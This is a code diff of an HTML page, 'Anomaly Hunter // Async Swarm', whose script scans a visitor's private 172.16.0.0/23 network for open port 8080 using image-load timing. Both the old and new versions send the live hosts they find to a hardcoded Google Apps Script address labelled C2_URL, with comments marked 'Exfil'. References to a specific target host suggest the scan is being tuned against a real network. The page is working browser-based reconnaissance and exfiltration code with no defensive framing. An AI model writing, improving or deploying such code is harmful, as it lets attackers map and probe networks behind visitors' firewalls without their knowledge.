@@ -1,136 +1,153 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Adaptive Anomaly Hunter</title>
+    <title>Anomaly Hunter // Async Swarm</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
-        .success { border: 2px solid #0f0; padding: 15px; margin: 20px 0; background: #001100; }
-        .stat-box { border-bottom: 1px solid #333; padding-bottom: 5px; margin-bottom: 10px; color: #888; }
+        body { background: #0d0d0d; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
+        .success-box { border: 2px solid #0f0; background: #002200; padding: 15px; margin-bottom: 10px; animation: flash 0.5s; }
+        .stat-line { border-bottom: 1px solid #333; padding: 5px 0; color: #666; display: flex; justify-content: space-between; }
         .highlight { color: #fff; font-weight: bold; }
+        #progress-bar { height: 4px; background: #333; margin-top: 10px; width: 100%; }
+        #progress-fill { height: 100%; background: #0f0; width: 0%; transition: width 0.1s; }
+        @keyframes flash { 0% { background-color: #0f0; color: #000; } 100% { background-color: #002200; color: #0f0; } }
     </style>
 </head>
 <body>
-    <h1>// ADAPTIVE ANOMALY HUNTER //</h1>
+    <h3>// ANOMALY HUNTER [SWARM MODE] //</h3>
     
-    <div class="stat-box">
-        <div>STATUS: <span id="status" class="highlight">Initializing...</span></div>
-        <div>BASELINE (MEDIAN): <span id="median">Calculating...</span></div>
-        <div>SCAN PROGRESS: <span id="progress">0/254</span></div>
+    <div class="stat-line">
+        <span>TARGET SCOPE:</span>
+        <span class="highlight">172.16.0.0/23 (Randomized)</span>
+    </div>
+    <div class="stat-line">
+        <span>STRATEGY:</span>
+        <span class="highlight">Img-Tag Timing (Non-Blocking)</span>
     </div>
 
+    <br>
+    <div id="status">INITIALIZING SWARM...</div>
+    <div id="progress-bar"><div id="progress-fill"></div></div>
+    <br>
+    
     <div id="results"></div>
 
     <script>
         // --- CONFIGURATION ---
-        var C2_URL = "https://script.google.com/macros/s/AKfycbwWQQRwwAJ84yYCT6ykZpDCzTKsy0ZVom4_tDxSumkrFyhzXWpTR9er6b9k9auDkeTA/exec"; 
         var TARGET_PORT = 8080;
-        var TIMEOUT_LIMIT = 200; // 200ms is plenty for LAN. Anything slower is "Dead".
-        var CONCURRENCY = 10;    // Reduced to prevent browser queue clogging
+        var TIMEOUT = 1500;    // Allow plenty of time for dead hosts to time out naturally
+        var CONCURRENCY = 15;  // Higher concurrency is safe with Randomization
+        var C2_URL = "https://script.google.com/macros/s/AKfycbwWQQRwwAJ84yYCT6ykZpDCzTKsy0ZVom4_tDxSumkrFyhzXWpTR9er6b9k9auDkeTA/exec";
 
-        // --- STATE ---
-        var results = []; 
+        // --- PREPARE TARGETS ---
         var queue = [];
-        for(var i=1; i<255; i++) queue.push(i);
+        [0, 1].forEach(subnet => {
+            for(var i=1; i<255; i++) queue.push("172.16." + subnet + "." + i);
+        });
 
-        // --- MATH ENGINE ---
-        function calculateMedian(values) {
-            if(values.length === 0) return 0;
-            values.sort((a,b) => a-b);
-            var half = Math.floor(values.length / 2);
-            return values[half];
+        // FISHER-YATES SHUFFLE (CRITICAL FIX)
+        // This ensures we hit 1.40 early roughly 50% of the time, 
+        // rather than waiting for 300 dead IPs to timeout first.
+        for (let i = queue.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [queue[i], queue[j]] = [queue[j], queue[i]];
         }
 
-        function analyzeAndReport() {
-            // 1. Establish Baseline (The "Dead" IPs)
-            // In your env, most IPs will equal TIMEOUT_LIMIT (200ms)
-            var times = results.map(r => r.time);
-            var median = calculateMedian(times);
+        var total = queue.length;
+        var completed = 0;
+        var activeRequests = 0;
+
+        // --- SCANNER LOGIC ---
+        function scanNext() {
+            if(queue.length === 0) return;
+            if(activeRequests >= CONCURRENCY) return;
+
+            var ip = queue.shift();
+            activeRequests++;
             
-            document.getElementById('median').innerText = median + "ms";
-            document.getElementById('status').innerText = "Analyzing Deviations...";
-
-            // 2. Find the Anomaly
-            // Logic: The real target is FAST (~5ms). The dead IPs are SLOW (200ms).
-            // We look for latencies significantly LOWER than the median.
-            var anomaly = results.find(r => (median - r.time) > 100); 
-
-            if(anomaly) {
-                var msg = "TARGET CONFIRMED: 172.16.0." + anomaly.octet;
-                var details = "Response: " + anomaly.time + "ms (Deviation: " + (median - anomaly.time) + "ms)";
-                
-                document.getElementById('results').innerHTML = 
-                    "<div class='success'><h2>" + msg + "</h2><p>" + details + "</p></div>";
-
-                // Exfil to Drive
-                fetch(C2_URL, {
-                    method: "POST", mode: "no-cors",
-                    headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({
-                        timestamp: new Date().toISOString(),
-                        type: "ANOMALY_CONFIRMED",
-                        target_ip: "172.16.0." + anomaly.octet,
-                        latency: anomaly.time,
-                        baseline: median
-                    })
-                });
-            } else {
-                document.getElementById('status').innerText = "SCAN COMPLETE. NO ANOMALIES FOUND.";
-            }
+            checkIP(ip).then(() => {
+                activeRequests--;
+                updateProgress();
+                scanNext(); // Keep the chain alive
+            });
+            
+            scanNext(); // Spawn more if concurrency allows
         }
 
-        // --- PROBE ENGINE ---
-        function scan(octet) {
+        function checkIP(ip) {
             return new Promise(resolve => {
-                var ip = "172.16.0." + octet;
                 var start = performance.now();
                 var img = new Image();
                 var isDone = false;
 
-                var finish = function() {
+                // WRAPPER to handle the result
+                var finish = (status) => {
                     if(isDone) return;
                     isDone = true;
-                    var duration = Math.round(performance.now() - start);
-                    results.push({octet: octet, time: duration});
+                    var time = Math.round(performance.now() - start);
+
+                    // LOGIC: 
+                    // Dead IPs (Timeout) = >200ms (usually 1000ms+)
+                    // Live IPs (404/200) = <100ms (Your manual check was 6ms)
+                    if(time < 150) {
+                        reportHit(ip, time);
+                    }
                     
-                    document.getElementById('progress').innerText = results.length + "/254";
+                    // Cleanup to free socket
+                    img.src = "";
+                    img = null;
                     resolve();
                 };
 
-                img.onload = finish;
-                img.onerror = finish; // Target (.181) triggers this in ~5ms
+                // IMAGE EVENTS
+                // Note: Both onload and onerror mean the port is OPEN/REACHABLE.
+                // A closed port (RST) or Stealth (Timeout) will fire onerror,
+                // but usually with different timing.
+                // However, on 'file://', PNA might block onload. 
+                // We rely purely on the SPEED of the failure.
+                img.onload = () => finish("load"); 
+                img.onerror = () => finish("error");
 
-                // HARD STOP at 200ms. 
-                // This clears the browser queue for the next batch.
-                setTimeout(function() {
-                    if(!isDone) {
-                        img.src = ""; // Force kill connection
-                        // Log as max timeout
-                        results.push({octet: octet, time: TIMEOUT_LIMIT});
-                        isDone = true;
-                        document.getElementById('progress').innerText = results.length + "/254";
-                        resolve();
-                    }
-                }, TIMEOUT_LIMIT);
-
+                // TRIGGER
                 img.src = "http://" + ip + ":" + TARGET_PORT + "/favicon.ico?r=" + Math.random();
+
+                // SAFETY TIMEOUT (For truly dead/stealth hosts)
+                setTimeout(() => {
+                    if(!isDone) finish("timeout");
+                }, TIMEOUT);
             });
         }
 
-        // --- BATCH PROCESSOR ---
-        async function runBatch() {
-            while(queue.length > 0) {
-                var batch = [];
-                // Only fire 'CONCURRENCY' amount at once
-                for(var i=0; i<CONCURRENCY && queue.length > 0; i++) {
-                    batch.push(scan(queue.shift()));
-                }
-                await Promise.all(batch);
-            }
-            analyzeAndReport();
+        // --- REPORTING ---
+        function reportHit(ip, latency) {
+            var div = document.createElement("div");
+            div.className = "success-box";
+            div.innerHTML = "<strong>>> ANOMALY DETECTED:</strong> " + ip + " <span style='float:right'>" + latency + "ms</span>";
+            document.getElementById('results').appendChild(div);
+
+            // Exfil
+            fetch(C2_URL, {
+                method: "POST", mode: "no-cors",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({ type: "HIT", ip: ip, ms: latency, date: new Date() })
+            });
         }
 
-        document.getElementById('status').innerText = "Scanning Subnet (Batch Size: " + CONCURRENCY + ")...";
-        runBatch();
+        function updateProgress() {
+            completed++;
+            var pct = (completed / total) * 100;
+            document.getElementById('progress-fill').style.width = pct + "%";
+            document.getElementById('status').innerText = "SCANNING: " + completed + "/" + total;
+            
+            if(completed >= total) {
+                document.getElementById('status').innerText = "SCAN COMPLETE.";
+                if(document.getElementById('results').children.length === 0) {
+                    document.getElementById('results').innerHTML = "<div style='color:#666'>No targets found matching timing profile (<150ms).</div>";
+                }
+            }
+        }
+
+        // START
+        scanNext();
 
     </script>
 </body>
